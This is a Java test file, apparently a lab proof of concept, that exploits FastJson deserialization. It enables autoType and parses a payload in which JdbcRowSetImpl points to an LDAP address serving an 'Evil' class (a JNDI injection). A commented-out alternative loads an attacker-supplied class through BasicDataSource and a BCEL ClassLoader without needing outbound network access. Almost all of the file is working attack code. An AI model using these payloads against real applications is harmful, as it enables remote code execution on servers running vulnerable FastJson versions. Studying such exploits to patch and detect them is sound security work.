package FastJson;

import Bean.People;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.rowset.JdbcRowSetImpl;
import org.apache.tomcat.dbcp.dbcp2.BasicDataSource;

import java.sql.SQLException;

public class Test {
    public static void main(String[] args) throws SQLException {
        System.out.println(System.getProperty("java.version"));

//        People people = new People();
//        people.setName("xxf");
//        people.setAge(18);
//        System.out.println(JSON.toJSON(people));

//         FastJson 1.2.24 原理
//        System.out.println("java version: " + System.getProperty("java.version"));
//        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
//        jdbcRowSet.setDataSourceName("rmi://127.0.0.1:1099/test");
//        jdbcRowSet.setAutoCommit(true);


        String exp = "{\n" +
                "    {\n" +
                "        \"@type\": \"Lcom.sun.rowset.JdbcRowSetImpl;\",\n" +
                "        \"dataSourceName\":\"ldap://127.0.0.1:1099/Evil\",\n" +
                "        \"autoCommit\":true\n" +
                "    }:\"x\"\n" +
                "}";

//        不出网
//        String exp = "{\n" +
//                "    {\n" +
//                "        \"@type\": \"com.alibaba.fastjson.JSONObject\",\n" +
//                "        \"x\":{\n" +
//                "                \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
//                "                \"driverClassLoader\": {\n" +
//                "                    \"@type\": \"Lcom.sun.org.apache.bcel.internal.util.ClassLoader;\"\n" +
//                "                },\n" +
//                "                \"driverClassName\": \"$$BCEL$$" + BCELTest.getEvilClass() +"\"\n" +
//                "        }\n" +
//                "    }: \"x\"\n" +
//                "}";

        ;
        System.out.println(exp);

//        ParserConfig parserConfig = ParserConfig.getGlobalInstance();
//        parserConfig.setAutoTypeSupport(true);
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
//
        JSON.parse(exp);

//
//        System.out.println( people.getName());
    }
}
